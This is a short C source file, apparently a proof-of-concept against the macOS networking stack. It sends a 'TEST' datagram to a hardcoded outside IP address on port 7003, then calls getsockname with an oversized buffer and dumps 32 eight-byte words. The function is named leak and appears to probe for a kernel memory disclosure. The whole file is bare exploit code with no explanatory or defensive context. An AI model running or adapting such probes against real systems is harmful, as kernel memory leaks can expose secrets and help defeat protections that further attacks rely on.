#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>
#include <net/if.h>
#include <netinet/in_var.h>
#include <netinet6/nd6.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int allocation(){
	int sock;
	struct sockaddr_in saddr;

	sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
//	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	if(sock < 0){
		perror("create socket");
	}

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_len = sizeof(saddr);
	saddr.sin_family = PF_INET;
	saddr.sin_port = htons(7003);
	saddr.sin_addr.s_addr = inet_addr("132.145.210.169");
	int len = sizeof(saddr);
	if(sendto(sock, "TEST", 4, MSG_WAITALL, (struct sockaddr *) &saddr, sizeof(saddr)) < 0){
		perror("sendto");
	}
/*
	if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0){
		perror("connect");
		exit(0);
	}
*/
/*
	if(sendto(sock, "Hello", 5, 0, NULL, sizeof(saddr)) < 0){
		perror("send");
	}
*/
	return sock;
}

int allocationTCP(){
	int sock;
    struct sockaddr_in saddr;

    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock < 0){
        perror("create socket");
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_len = sizeof(saddr);
    saddr.sin_family = PF_INET;
    saddr.sin_port = htons(7003);
    saddr.sin_addr.s_addr = inet_addr("132.145.210.169");
    int len = sizeof(saddr);
    
	if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0){
        perror("connect");
        exit(0);
    }
	return sock;
}

void leak(int sock){
	size_t len=0x100;
	char *sockname = malloc(0x100);
/*
	read(sock, sockname, 0x10);
	printf("got %s\n", sockname);

	write(sock, "HHHH", 4);
*/
	memset(sockname, 0, 0x100);
	if(getsockname(sock, (struct sockaddr *)sockname, &len) < 0){
		perror("getsockname");
		exit(0);
	}
	
	printf("Got info:\n");
	for(int i=0; i<0x100/8; i++){
		printf("0x%llx\n", *(size_t *)(sockname+8*i));
	}
	//printf("Got name info %s", sockname);
	struct sockaddr_in my_addr;
	memset(&my_addr, 0, sizeof(my_addr));
	len = sizeof(my_addr);
	if(getsockname(sock, (struct sockaddr *)&my_addr, &len) < 0){
        perror("getsockname");
        exit(0);
    }
	char myIP[16];
	size_t myPort;
	inet_ntop(AF_INET, &my_addr.sin_addr, myIP, sizeof(myIP));
	myPort = ntohs(my_addr.sin_port);
	printf("Local ip address: %s\n", myIP);
}


int main(){
	int sock = allocation();
	leak(sock);
}
